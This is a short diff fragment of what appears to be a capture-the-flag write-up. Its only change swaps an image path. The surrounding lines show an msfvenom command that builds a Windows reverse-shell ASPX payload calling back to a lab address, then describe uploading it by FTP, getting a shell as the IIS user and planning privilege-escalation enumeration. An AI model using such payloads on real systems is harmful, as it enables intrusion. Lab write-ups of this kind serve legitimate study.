@@ -51,7 +51,7 @@ msfvenom -a x86 --payload windows/shell_reverse_tcp -f aspx LHOST=10.10.14.25 LP
 
 and upload this file through FTP and start a listener.
 
-![](../../.gitbook/assets/image%20%281%29.png)
+![](../../.gitbook/assets/image%20%285%29%20%281%29.png)
 
 so, we got a revershell as the iis user, and not sure how I should proceed from now, So, I'll just try to upload a winpeas.exe file and run the local PrivEsc enumeration
 
